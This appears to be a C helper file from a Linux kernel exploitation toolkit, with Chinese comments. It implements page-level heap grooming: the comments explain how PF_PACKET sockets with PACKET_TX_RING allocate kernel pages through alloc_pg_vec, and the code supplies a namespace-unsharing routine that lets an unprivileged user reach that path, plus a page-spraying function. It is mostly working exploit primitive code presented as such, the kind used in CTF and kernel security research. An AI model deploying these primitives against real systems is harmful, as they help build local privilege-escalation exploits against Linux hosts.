// 页及堆风水
// 当我们创建一个 protocol 为 PF_PACKET 的 socket 之后
// 先调用 setsockopt() 将 PACKET_VERSION 设为 TPACKET_V1 / TPACKET_V2
// 再调用 setsockopt() 提交一个 PACKET_TX_RING ，此时便存在如下调用链
// __sys_setsockopt()
//     sock->ops->setsockopt()
//         packet_setsockopt() // case PACKET_TX_RING ↓
//             packet_set_ring()
//                 alloc_pg_vec()
//
// pgv 中的页面会在 socket 被关闭后释放，这也方便我们后续的页级堆风水
// 不过需要注意的是低权限用户无法使用该函数，但是我们可以通过开辟新的命名空间来绕过该限制。
//
// static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
// {
//     unsigned int block_nr = req->tp_block_nr;
//     struct pgv *pg_vec;
//     int i;

//     pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL |
//     __GFP_NOWARN); if (unlikely(!pg_vec))
//         goto out;

//     for (i = 0; i < block_nr; i++) {
//         pg_vec[i].buffer = alloc_one_pg_vec_page(order);
//         if (unlikely(!pg_vec[i].buffer))
//             goto out_free_pgvec;
//     }

// out:
//     return pg_vec;

// out_free_pgvec:
//     free_pg_vec(pg_vec, order, block_nr);
//     pg_vec = NULL;
//     goto out;
// }

enum tpacket_versions {
  TPACKET_V1,
  TPACKET_V2,
  TPACKET_V3,
};

struct tpacket_req {
  unsigned int tp_block_size;
  unsigned int tp_block_nr;
  unsigned int tp_frame_size;
  unsigned int tp_frame_nr;
};

void setup_sandbox(void) {
  char edit[0x100];
  int tmp_fd;

  unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

  tmp_fd = open("/proc/self/setgroups", O_WRONLY);
  write(tmp_fd, "deny", strlen("deny"));
  close(tmp_fd);

  tmp_fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getuid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);

  tmp_fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getgid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);
}

// size: 转换为order = size >> 12
// nr: 内核态 block_nr，也就是 pg_vec 数量
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr) {
  struct tpacket_req req;
  int socket_fd, version;
  int ret;

  socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
  if (socket_fd < 0) {
    EMSG("Error socket(AF_PACKET, SOCK_RAW, PF_PACKET)");
    ret = socket_fd;
    goto err_out;
  }

  version = TPACKET_V1;
  ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, &version,
                   sizeof(version));
  if (ret < 0) {
    EMSG("Error setsockopt(PACKET_VERSION)");
    goto err_setsockopt;
  }

  memset(&req, 0, sizeof(req));
  req.tp_block_size = size;
  req.tp_block_nr = nr;   
  req.tp_frame_size = 0x1000;
  req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

  ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
  if (ret < 0) {
    EMSG("Error setsockopt(PACKET_TX_RING)");
    goto err_setsockopt;
  }

  return socket_fd;

err_setsockopt:
  close(socket_fd);
err_out:
  return ret;
}
